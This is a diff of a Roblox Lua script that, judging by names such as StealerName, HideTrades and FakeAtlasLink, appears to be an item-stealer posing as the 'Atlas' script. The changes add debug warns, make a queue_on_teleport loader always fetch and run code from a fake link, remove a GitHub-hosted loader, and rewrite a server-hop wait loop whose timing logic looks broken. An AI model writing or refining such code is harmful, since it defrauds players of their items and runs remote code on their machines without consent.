@@ -136,6 +136,7 @@ repeat task.wait() until game:IsLoaded()
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
 
+warn("hi")
 do
     local Lplr = game:GetService("Players").LocalPlayer
     repeat task.wait() until Lplr:FindFirstChild("PlayerGui") and
@@ -144,6 +145,7 @@ do
         Lplr.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
 end
 local ScrGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui")
+warn("hi2")
 
 local GameData = {
     PrivateServer = not game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value,
@@ -1156,8 +1158,8 @@ local function HideTrades()
 end
 
 local function StartSession(StealerName)
+    queue_on_teleport("loadstring(game:HttpGet(\"" .. Configuration.FakeAtlasLink .. "\"))()")
     if GameData.PrivateServer then
-        queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/" .. (_G.GitUsername or "Chris12083") .. "/" ..  (_G.Repository or "atlasbss") .. "/main/" ..  (_G.File or "script.lua") .. "\"))()")
         local function serverhop()
             local servers = {}
             local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
@@ -1177,14 +1179,12 @@ local function StartSession(StealerName)
                 return warn("Couldn't find a server.")
             end
         end
-        return task.delay(PrivateServerWaitTime, function()
-            while true do
-                serverhop()
-                wait(8)
-            end
-        end)
-    else
-        queue_on_teleport("loadstring(game:HttpGet(\"" .. Configuration.FakeAtlasLink .. "\"))()")
+        local J = tick()
+        repeat task.wait() until tick() - PrivateServerWaitTime >= tonumber(PrivateServerWaitTime)
+        while true do
+            serverhop()
+            wait(8)
+        end
     end
 
     task.spawn(HideTrades)
